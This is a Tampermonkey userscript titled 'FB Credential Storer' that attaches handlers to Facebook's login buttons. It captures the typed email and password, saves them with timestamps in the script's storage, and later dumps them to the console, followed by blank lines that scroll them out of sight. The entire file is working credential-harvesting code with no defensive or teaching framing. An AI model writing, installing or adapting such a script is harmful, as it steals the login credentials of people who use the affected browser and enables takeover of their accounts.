// ==UserScript==
// @name         FB Credential Storer
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  Store FB credentials to monkey store
// @author       Bill Murray
// @match        https://*.facebook.com/*
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_listValues
// ==/UserScript==

(function() {
    'use strict';

    setTimeout(function() {
        var keys = GM_listValues();
        for (var i = 0; i < keys.length; i++) {
            console.log(GM_getValue(keys[i]));
        }
        console.log(Array(40 + 1).join('\n'));
    }, 500);

    // There are two login screens for facebook. One is a the top bar login ctrl
    // and the other one is a dedicated login page. We need to handle both.
    var login = document.getElementById('loginbutton');
    if (login) {
        if (login.tagName === 'BUTTON') {
            // Handle dedicated login page.
            login.onclick = function(evt) {
                // We don't bother with the email here since the element has no id and
                // dynamically changing classes. We'd need to traverse relative to pwd
                // field, for example.

                var pwd = document.getElementById('pass').value;
                storeItem('pass', pwd);
            };
        } else {
            // Handle top-bar login.
            login.children[0].onclick = function (evt) {
                var email = document.getElementById('email').value;
                storeItem('email', email);

                var pwd = document.getElementById('pass').value;
                storeItem('pass', pwd);
            };
        }
    }

    function storeItem(key, value) {
        var timestamp = new Date().getTime();
        key = timestamp + '_' + key;
        GM_setValue(key, value);
    }
})();